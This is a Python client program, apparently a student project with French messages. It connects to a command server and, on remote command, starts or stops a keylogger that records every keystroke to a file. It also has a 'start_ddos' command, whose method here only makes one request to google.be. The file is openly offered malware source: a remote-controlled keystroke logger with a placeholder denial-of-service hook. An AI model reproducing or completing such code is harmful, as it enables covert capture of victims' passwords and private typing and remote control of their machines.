import socket
import logging
from pynput import keyboard
import requests
import time


host = "localhost"
port = 61589

logging.basicConfig(filename = (r"D:\Projet_dev_multi_clients\Dev\keyLog.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s')

class Client():
    
    def __init__(self, socket, clientAddress):

        self.socket = socket
        self.clientAddress = clientAddress
        self.listener = keyboard.Listener()
        self.initialize()

    def connection(self, socket, clientAddress):
        try:
            socket.connect(clientAddress)
            print("connecté !")
            data = socket.recv(1024)
            data = data.decode("utf-8")

            
            
            while True :    
                
                               

                if data == "start_Keylogger" :
                    print("keylogger fonctionne")
                    print(socket)
                    self.listener.start()

                    
                        
                elif data == "start_ddos":
                    self.ddos_attack()
                    socket.send("L'attaque ddos a commence".encode("utf-8"))

                        
                    
                        
                        
                elif data == "stop_Keylogger":
                    self.listener.stop()
                    socket.send("Le keylogger est fermé".encode("utf-8"))
                    print("stop keylogger")
                    
                        
                        
                elif  data == "get_log ":
                    print("Envoir des valeurs !")
                    
                        
                        
                elif data == "fin_connexion":
                    break
                    
                data = socket.recv(1024)
                data = data.decode("utf-8")
                    
        except ConnectionRefusedError:
            print("La connexion au serveur à échouée ")
            






    def start_key(self, key):
            logging.info(str(key))

    def initialize(self):
        self.listener = keyboard.Listener(on_press=self.start_key)

    def ddos_attack(self): 
        time.sleep(5) 
        My_requests = requests.get("https://google.be")
        if My_requests.status_code == 200 : 
            print("Requête réalisée avec succes ")
        else :
            print("Erreur lors de la requête")





s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

clientAddress = ((host, port))

Client = Client(s, clientAddress)
Client.initialize()
Client.connection(s, clientAddress)

print("Fin de la connection")
s.close()
